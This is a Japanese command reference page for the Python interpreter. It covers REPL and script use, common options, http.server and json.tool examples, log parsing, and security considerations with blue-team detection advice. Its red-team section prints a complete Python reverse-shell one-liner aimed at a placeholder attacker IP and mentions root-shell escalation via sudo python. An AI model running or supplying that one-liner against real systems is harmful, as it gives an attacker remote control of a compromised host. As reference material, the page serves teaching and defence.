# `python` - Pythonインタプリタを実行する

## 概要

`python` (またはモダンなシステムでは `python3`) は、Pythonプログラミング言語のコードを実行するためのインタプリタです。主に2つの方法で使用されます。

1. **対話モード (REPL)**: コマンドを直接入力し、リアルタイムで結果を確認する対話的なシェルを起動します。
2. **スクリプト実行**: `.py` 拡張子を持つPythonスクリプトファイルを指定して実行します。

Pythonは、Web開発、データ分析、インフラ自動化、セキュリティツール開発など、非常に幅広い用途で利用される高レベルプログラミング言語です。

(出自: OSの基本パッケージに含まれることが多い)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| **`bash` / `sh`** | **シェルスクリプト**のインタプリタ。他のコマンド連携が得意。Pythonは、より複雑なデータ構造や豊富な外部ライブラリを扱える**汎用プログラミング言語**です。 | - |
| **`pip`** | Pythonの**パッケージマネージャ**。Pythonで利用する外部ライブラリをインストールします。`python` は、`pip` でインストールされたライブラリを使ってコードを**実行する**インタプリタです。 | - |

## よく連携されるコマンド

Pythonは `-m` オプションを通じて、多くのモジュールをコマンドのように直接実行できます。

### シナリオ例: 簡易的なWebサーバーを起動する (インフラ構築・運用視点)

* **目的**: ファイアウォールの内側にあるサーバーから、別のサーバーへ一時的にファイルを転送したいが、`scp` などが使えない場合に、簡易的なWebサーバーを立てる。
* **連携コマンド**: `python` (`-m http.server`)
* **解説**: `python3 -m http.server` を実行すると、カレントディレクトリをドキュメントルートとするWebサーバーが起動します。相手側から `curl` や `wget` でファイルをダウンロードさせることが可能になります。
* **コマンド例**:

    ```bash
    # ポート8000番で簡易Webサーバーを起動
    python3 -m http.server 8000
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **実行モード** | |
| ⭐ `-c "<command>"` | 文字列として渡されたPythonコマンドを実行して終了します。ワンライナーで多用されます。 |
| ⭐ `-m <module>` | Pythonのライブラリモジュールをスクリプトとして実行します。**非常に便利で重要です**。 |
| ⭐ `<script.py>` | 指定したPythonスクリプトファイルを実行します。 |
| **その他** | |
| `-V`, `--version` | Pythonインタプリタのバージョンを表示します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: JSON文字列を整形して表示する。
* **組み合わせ**: `echo '{"key": "value"}' | python3 -m json.tool`
* **解説**: `json.tool` モジュールは、標準入力から受け取ったJSONデータを整形して表示します。APIの応答を確認する際などに便利です。
* **例**:

    ```bash
    # APIのレスポンスをパイプで渡して整形する
    curl -s [http://api.example.com/data](http://api.example.com/data) | python3 -m json.tool
    ```

### 2. ブルーチーム視点

* **タスク**: 複雑な条件でログを分析するスクリプトを実行する。
* **組み合わせ**: `python3 <log_parser.py> <logfile>`
* **解説**: `grep`, `awk`, `sed` の組み合わせでは難しい、複雑な条件でのログ分析（JSONログのパース、複数行にまたがるイベントの関連付けなど）をPythonスクリプトで実現します。
* **例**:

    ```bash
    # 自作のログパーサーを実行
    python3 parse_app_logs.py /var/log/app/error.log
    ```

### 3. レッドチーム視点

* **タスク**: **ワンライナーでのリバースシェル確立**。
* **組み合わせ**: `python3 -c 'import socket,os,pty;s=...'`
* **解説**: Webアプリケーションの脆弱性などを通じてコマンドインジェクションに成功した場合、この一行のPythonコードを実行させることで、標的サーバーから攻撃者のマシンへシェルの接続を確立し、システムを乗っ取ります。
* **例 (リバースシェル)**:

    ```python
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `ModuleNotFoundError: No module named 'requests'`
    * **考えられる原因**: スクリプトが必要とするライブラリ（この場合は `requests`）がインストールされていません。
    * **解決策**: `pip install requests` を実行して、必要なパッケージをインストールしてください。**仮想環境 (`venv`)** を利用することが強く推奨されます。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **信頼できないスクリプトの実行**。未知のスクリプトを実行することは、未知のバイナリを実行するのと同じくらい危険です。
* **悪用シナリオ**: **サプライチェーン攻撃**。`pip` でインストールする外部ライブラリに悪意のあるコードが仕込まれている場合、それを `import` して実行すると、システムが侵害される可能性があります。

### GTFOBins / LOLBAS における利用例

* **機能**: **Shell**, **Reverse Shell**, **Privilege Escalation**
* **解説**: もしユーザーが `sudo python` を実行できる権限を持っている場合、`-c` オプションを使って簡単にroot権限のシェルを起動できます。
* **参照**: `https://gtfobins.github.io/gtfobins/python/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 信頼できないPythonスクリプトを実行しない。`pip` でインストールするパッケージは、出所が明確で信頼できるものに限定する。
* **Detection (検知)**: `python` プロセスからの不審なネットワーク接続や、`os.system`, `subprocess.run` といった関数呼び出しによる子プロセスの生成を `auditd` や EDR で監視する。

## 注意点・補足

* **仮想環境 (`venv`) の利用**: システムのPython (`/usr/bin/python3`) はOS自身も利用しており、ここに `pip` で直接パッケージを追加・変更するとOSが不安定になる可能性があります。**プロジェクトごとに必ず `python3 -m venv <dir>` で仮想環境を作成し、それを有効化してから利用する**のがベストプラクティスです。
